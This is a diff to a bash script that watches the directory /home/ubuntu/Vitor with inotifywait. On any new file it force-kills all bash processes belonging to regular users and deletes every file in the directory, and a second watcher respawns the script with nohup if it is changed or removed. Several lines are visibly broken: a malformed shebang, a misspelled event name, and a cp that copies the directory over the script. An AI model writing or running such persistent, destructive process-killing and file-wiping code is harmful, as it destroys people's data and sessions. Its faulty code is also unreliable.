@@ -1,15 +1,22 @@
-#!/bin/bash
+#!bin/bash
 
 DIR="/home/ubuntu/Vitor"
+SCRIPT_PID=$$
+SCRIPT_PATH=$(realpath "$0")
 
-for script in $(ps -eo pid,uid,command | grep '.sh' | awk '{print $3}'); do
-    if [[ "$(ps -eo pid,uid,command | grep "[/]bin/bash $script" | awk '{print $2}')" != "0" ]]; then
-        PID_ORIGINAL=$(ps -eo pid,command | grep "[/]bin/bash $script" | awk '{print $1}')
-        
-        if [ -n "$PID_ORIGINAL" ]; then
-            kill -9 "$PID_ORIGINAL"
-        fi
+inotifywait -mre create --format '%w%f' "$DIR" | while read NEW_FILE
+do
+    if [[ "$NEW_FILE" == "$SCRIPT_PATH" ]]; then
+        continue
     fi
-done
+    
+    ps -eo uid,pid,cmd | awk '$1 >= 1000 && /bash/ {print $2}' | grep -v "^$SCRIPT_PID$" | xargs -I {} kill -9 {}
+    find "$DIR" -type f ! -path "$SCRIPT_PATH" -exec rm -f {} \;
+done &
 
-find "$DIR" -type f -exec rm -f {} \;
+inotifywait -mre delete_sef,modify "$SCRIPT_PATH" | while read EVENT
+do
+    cp "$DIR" "$SCRIPT_PATH"
+    chmod +x "$SCRIPT_PATH"
+    nohup "$SCRIPT_PATH" &
+done &
